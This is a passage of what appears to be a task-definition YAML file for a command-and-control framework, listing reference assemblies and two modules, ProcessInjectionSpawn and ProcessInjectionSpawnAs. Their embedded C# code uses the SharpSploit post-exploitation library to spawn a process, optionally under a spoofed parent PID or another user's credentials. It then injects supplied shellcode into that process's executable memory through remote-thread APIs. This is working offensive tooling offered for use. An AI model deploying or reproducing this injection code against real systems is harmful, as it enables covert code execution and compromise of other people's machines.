      Location: net40\System.DirectoryServices.Protocols.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.ServiceProcess.dll
      Location: net40\System.ServiceProcess.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.XML.dll
      Location: net35\System.XML.dll
      DotNetVersion: Net35
    - Name: System.Windows.Forms.dll
      Location: net35\System.Windows.Forms.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.Protocols.dll
      Location: net35\System.DirectoryServices.Protocols.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: System.ServiceProcess.dll
      Location: net35\System.ServiceProcess.dll
      DotNetVersion: Net35
    - Name: System.Windows.Forms.dll
      Location: net40\System.Windows.Forms.dll
      DotNetVersion: Net40
    - Name: System.XML.dll
      Location: net40\System.XML.dll
      DotNetVersion: Net40
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: ProcessInjectionSpawn
  Aliases: []
  Author:
    Name: ''
    Handle: ''
    Link: ''
  Description: aaa
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: "using System;\nusing System.Diagnostics;\n\nusing SharpSploit.Execution;\nusing SharpSploit.Execution.Injection;\n\npublic static class Task\n{\n	public static string Execute(string Technique, string ProcessName, string ShellCode,string ParentPID)\n	{\n		string output = \"\";\n		RemoteThreadCreate.APIS apiTechnique;\n\n		if (Technique == \"CreateRemoteThread\") {apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;}\n		else if (Technique == \"NtCreateThreadEx\") {apiTechnique = RemoteThreadCreate.APIS.NtCreateThreadEx;}\n		else if (Technique == \"RtlCreateUserThread\") {apiTechnique = RemoteThreadCreate.APIS.RtlCreateUserThread;}\n		//TODO review how to detect empty string  \n        else if (Technique == \"\" || Technique == \"\\\"\")\n		{\n			apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;\n			output += \"No technique passed as argument. CreateRemoteThread technique was used\\n\";\n		}\n		else\n        {\n			output += \"Injection technique \" + Technique + \" is not implemented. Choose one of the following values:\\n\" +\n				\"CreateRemoteThread\\n\" +\n				\"NtCreateThreadEx\\n\" +\n				\"RtlCreateUserThread\\n\";\n			return output;\n		}\n        \n		try\n		{	\n        	int ProcID;\n        	if (ParentPID == \"\" || ParentPID == \"\\\"\")\n            {\n            	ProcID = (int)Shell.CreateProcessPInvoke(ProcessName).dwProcessId;\n            }\n            else\n            {\n            	int PPID = Int32.Parse(ParentPID);\n			    ProcID = (int)Shell.CreateProcessPInvokePPID(ProcessName,PPID).dwProcessId;\n            }\n        	     	\n			Process proc = Process.GetProcessById(ProcID);\n			RemoteThreadCreate injectionTechnique = new RemoteThreadCreate\n			{\n				api = apiTechnique,\n				suspended = false\n			};\n			SectionMapAlloc allocationTechnique = new SectionMapAlloc\n			{\n				localSectionPermissions = Win32.WinNT.PAGE_READWRITE,\n				remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,\n				sectionAttributes = Win32.WinNT.SEC_COMMIT\n			};\n\n			PICPayload payload = new PICPayload(Convert.FromBase64String(ShellCode));\n			IntPtr payloadLocation = allocationTechnique.Allocate(payload, proc);\n			Injector.Inject(payload, allocationTechnique, injectionTechnique, proc);\n			\n			output += \"attempting to inject the provided shellcode into process \" + proc.ProcessName;\n			return output;\n		}\n		catch (Exception e) { return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n		return output;\n	}\n}\n\n"
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: Technique
    Value: ''
    DefaultValue: CreateRemoteThread
    Description: Injection technique
    SuggestedValues:
    - CreateRemoteThread
    - NtCreateThreadEx
    - RtlCreateUserThread
    Optional: true
    DisplayInCommand: true
    FileOption: false
  - Name: ProcessName
    Value: ''
    DefaultValue: ''
    Description: Process ID of the process to impersonate
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: ShellCode
    Value: ''
    DefaultValue: ''
    Description: ShellCode to Inject.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: false
    FileOption: true
  - Name: ParentPID
    Value: ''
    DefaultValue: ''
    Description: ppid
    SuggestedValues: []
    Optional: true
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions:
    - Net35
    - Net40
    ReferenceAssemblies:
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.Protocols.dll
      Location: net40\System.DirectoryServices.Protocols.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.ServiceProcess.dll
      Location: net40\System.ServiceProcess.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.XML.dll
      Location: net35\System.XML.dll
      DotNetVersion: Net35
    - Name: System.Windows.Forms.dll
      Location: net35\System.Windows.Forms.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.Protocols.dll
      Location: net35\System.DirectoryServices.Protocols.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: System.ServiceProcess.dll
      Location: net35\System.ServiceProcess.dll
      DotNetVersion: Net35
    - Name: System.Windows.Forms.dll
      Location: net40\System.Windows.Forms.dll
      DotNetVersion: Net40
    - Name: System.XML.dll
      Location: net40\System.XML.dll
      DotNetVersion: Net40
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: ProcessInjectionSpawnAs
  Aliases: []
  Author:
    Name: ''
    Handle: ''
    Link: ''
  Description: aaa
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: "using System;\nusing System.Diagnostics;\n\nusing SharpSploit.Execution;\nusing SharpSploit.Execution.Injection;\n\npublic static class Task\n{\n	public static string Execute(string Technique, string ProcessName, string ShellCode,string Username, string Password, string Domain, string ParentPID)\n	{\n		string output = \"\";\n		RemoteThreadCreate.APIS apiTechnique;\n\n		if (Technique == \"CreateRemoteThread\") {apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;}\n		else if (Technique == \"NtCreateThreadEx\") {apiTechnique = RemoteThreadCreate.APIS.NtCreateThreadEx;}\n		else if (Technique == \"RtlCreateUserThread\") {apiTechnique = RemoteThreadCreate.APIS.RtlCreateUserThread;}\n		//TODO review how to detect empty string  \n        else if (Technique == \"\" || Technique == \"\\\"\")\n		{\n			apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;\n			output += \"No technique passed as argument. CreateRemoteThread technique was used\\n\";\n		}\n		else\n        {\n			output += \"Injection technique \" + Technique + \" is not implemented. Choose one of the following values:\\n\" +\n				\"CreateRemoteThread\\n\" +\n				\"NtCreateThreadEx\\n\" +\n				\"RtlCreateUserThread\\n\";\n			return output;\n		}\n        \n		try\n		{	\n        	int ProcID;\n        	if (ParentPID == \"\" || ParentPID == \"\\\"\")\n            {\n            	 ProcID = (int)Shell.createProcessAsPInvoke(ProcessName, Domain, Username, Password).dwProcessId;\n            }\n            else\n            {\n            	output += \"not implmented\";\n                return output;\n            	//TODO\n                // ADD FUNCTION IN SHARPSPLOIT\n                //int PPID = Int32.Parse(ParentPID);\n			    //ProcID = (int)Shell.CreateProcessPInvokePPID(ProcessName,PPID).dwProcessId;\n            }\n			Process proc = Process.GetProcessById(ProcID);\n			RemoteThreadCreate injectionTechnique = new RemoteThreadCreate\n			{\n				api = apiTechnique,\n				suspended = false\n			};\n			SectionMapAlloc allocationTechnique = new SectionMapAlloc\n			{\n				localSectionPermissions = Win32.WinNT.PAGE_READWRITE,\n				remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,\n				sectionAttributes = Win32.WinNT.SEC_COMMIT\n			};\n\n			PICPayload payload = new PICPayload(Convert.FromBase64String(ShellCode));\n			IntPtr payloadLocation = allocationTechnique.Allocate(payload, proc);\n			Injector.Inject(payload, allocationTechnique, injectionTechnique, proc);\n			\n			output += \"attempting to inject the provided shellcode into process \" + proc.ProcessName;\n			return output;\n		}\n		catch (Exception e) { return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n		return output;\n	}\n}\n\n"
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: Technique
    Value: ''
    DefaultValue: CreateRemoteThread
    Description: Injection technique
    SuggestedValues:
    - CreateRemoteThread
    - NtCreateThreadEx
    - RtlCreateUserThread
    Optional: true
    DisplayInCommand: true
    FileOption: false
  - Name: ProcessName
    Value: ''
    DefaultValue: ''
    Description: Process ID of the process to impersonate
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: ShellCode
    Value: ''
    DefaultValue: ''
    Description: ShellCode to Inject.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: false
    FileOption: true
  - Name: Username
    Value: ''
    DefaultValue: ''
    Description: ''
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Password
    Value: ''
    DefaultValue: ''
    Description: ''
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Domain
    Value: ''
    DefaultValue: ''
    Description: ''
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: ParentPID
    Value: ''
    DefaultValue: ''
    Description: ''
    SuggestedValues: []
    Optional: true
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions:
    - Net35
    - Net40
    ReferenceAssemblies:
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.Protocols.dll
      Location: net40\System.DirectoryServices.Protocols.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.ServiceProcess.dll
      Location: net40\System.ServiceProcess.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.XML.dll
      Location: net35\System.XML.dll
      DotNetVersion: Net35
    - Name: System.Windows.Forms.dll
      Location: net35\System.Windows.Forms.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.Protocols.dll
      Location: net35\System.DirectoryServices.Protocols.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: System.ServiceProcess.dll
      Location: net35\System.ServiceProcess.dll
      DotNetVersion: Net35
    - Name: System.Windows.Forms.dll
      Location: net40\System.Windows.Forms.dll
      DotNetVersion: Net40
    - Name: System.XML.dll
      Location: net40\System.XML.dll
      DotNetVersion: Net40
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []